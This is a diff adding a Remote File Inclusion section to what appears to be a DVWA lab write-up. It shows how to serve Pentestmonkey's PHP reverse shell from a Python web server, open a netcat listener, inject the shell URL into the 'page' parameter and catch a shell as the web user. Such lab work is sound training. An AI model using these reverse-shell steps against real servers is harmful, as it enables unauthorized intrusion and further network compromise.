@@ -149,7 +149,52 @@ Nothing but the `fi` file found that we already know!
 
 ### Remote File Inclusion
 
+1. Get [Pentestmonkey's PHP reverse shell](https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php) and make the required changes:
 
+    ![](shell_script.png)
+
+2. Launch a Python webserver from within the directory where the reverse shell is residing:
+
+    ```shell
+    # launcing a webserver on port 8888
+    python3 -m http.server 8888
+    Serving HTTP on 0.0.0.0 port 8888 (http://0.0.0.0:8888/) ...
+    ```
+
+3. Visit your server via the browser and copy the link directing to the shell script:
+
+    ![](webserver_browser.png)
+
+4. Open a netcat listener:
+
+    ```shell
+    # setting up a listener on port 9999
+    sudo nc -lvnp 9999
+    listening on [any] 9999 ...
+    ```
+
+5. Paste the link as the value of the `page` parameter:
+
+    ![](visiting_shell.png)
+
+6. Check the listener:
+
+   ```shell
+   # catching the reverse shell
+   sudo nc -lvnp 9999
+    listening on [any] 9999 ...
+    connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 43942
+    Linux CSpanias 5.15.133.1-microsoft-standard-WSL2 #1 SMP Thu Oct 5 21:02:42 UTC 2023 x86_64 GNU/Linux
+    17:12:24 up  5:50,  2 users,  load average: 0.06, 0.07, 0.25
+    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+    kali              -                12:33    6:21m  0.00s   ?    /usr/sbin/xrdp-sesman
+    kali     pts/1    -                10:40    6:31m  0.00s   ?    -bash
+    uid=149(_dvwa) gid=156(_dvwa) groups=156(_dvwa)
+    /bin/sh: 0: can't access tty; job control turned off
+    $   
+   ```
+
+> If this was a remote webserver, and not hosted on our PC, we would gain access to the actual webserver where we could further enumerate the network, pivot, or perform privilege escalation.
 
 ## Security: Medium
 
